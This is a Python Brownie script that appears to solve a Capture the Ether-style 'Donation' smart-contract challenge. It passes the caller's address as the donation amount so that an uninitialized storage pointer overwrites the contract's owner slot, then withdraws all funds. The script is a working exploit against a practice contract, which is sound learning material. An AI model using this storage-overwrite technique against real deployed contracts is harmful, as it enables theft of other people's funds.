from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import DonationChallenge
from math import floor

##########################################
# Goal of the exercise
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        donation = load_challenge(ContractObject=DonationChallenge, instance_key='donation')
    else:
        # _from, acc, _from2, _acc2 = define_from_acc(2)
        donation = deploy_locally(ContractObject=DonationChallenge, from_account=_from | {'value':1e18})
    
    # call donate with `etherAmount` as my wallet address
    # to overwrite the second storage slot where `owner` is located
    donation.donate(acc.address, _from | {'value':floor(int(acc.address,16)//1e36)})
    
    # check if I'm owner
    print(donation.owner())

    # call `withdraw()` to withdraw all funds
    donation.withdraw(_from)

    # check if challenge is complete
    result = donation.isComplete()
    print(result)

    # return the result
    return result
    

def main():
    solve_challenge()
